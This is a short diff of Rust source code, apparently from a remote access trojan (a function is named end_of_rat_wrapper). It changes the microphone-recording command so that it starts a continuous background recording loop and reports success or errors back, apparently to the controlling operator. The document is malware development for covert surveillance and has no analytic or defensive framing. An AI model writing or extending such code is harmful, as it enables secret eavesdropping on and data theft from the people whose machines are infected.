@@ -179,15 +179,23 @@ async fn browser_info_wrapper(alias: String) {
 }
 
 async fn mic_rec_wrapper(alias: String) {
-    println!("[{}] Enregistrement microphone...", alias);
-    match mic_rec::record_mic().await {
-        Ok(_) => {
-            let _ = connexion::send_directive_status("mic_rec", "success", "Terminé").await;
+    println!(
+        "[{}] Démarrage de la boucle d'enregistrement micro...",
+        alias
+    );
+
+    let flag = mic_rec::init_mic_rec_flag();
+
+    tokio::spawn(async move {
+        match mic_rec::mic_rec_loop(flag).await {
+            Ok(_) => {
+                let _ = connexion::send_directive_status("mic_rec", "success", "Terminé").await;
+            }
+            Err(e) => {
+                let _ = connexion::send_directive_status("mic_rec", "error", &e.to_string()).await;
+            }
         }
-        Err(e) => {
-            let _ = connexion::send_directive_status("mic_rec", "error", &e.to_string()).await;
-        }
-    }
+    });
 }
 
 async fn end_of_rat_wrapper(alias: String) {
